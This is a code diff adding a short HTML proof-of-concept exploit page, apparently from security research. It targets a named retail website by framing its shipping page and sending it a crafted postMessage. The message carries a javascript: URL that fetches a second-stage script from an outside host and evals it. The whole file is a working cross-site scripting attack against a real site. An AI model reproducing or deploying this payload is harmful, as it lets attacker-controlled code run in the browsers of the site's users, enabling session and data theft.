@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit Page</title>
+</head>
+<body>
+    <h2>Triggering XSS...</h2>
+    <iframe id="myIframe" src="https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true"></iframe>
+
+    <script>
+        window.addEventListener('load', function() {
+            const iframe = document.getElementById('myIframe');
+            
+            setTimeout(() => {
+                iframe.contentWindow.postMessage({
+                    source: "sa-fe",
+                    type: "v-track-mode",
+                    data: {
+                        isVtrack: true,
+                        // Multi-stage payload
+                        userURL: "jaVascript:fetch('https://daemoon.me/Halara/stage4.js').then(r=>r.text()).then(eval)"
+                    }
+                }, "*");
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
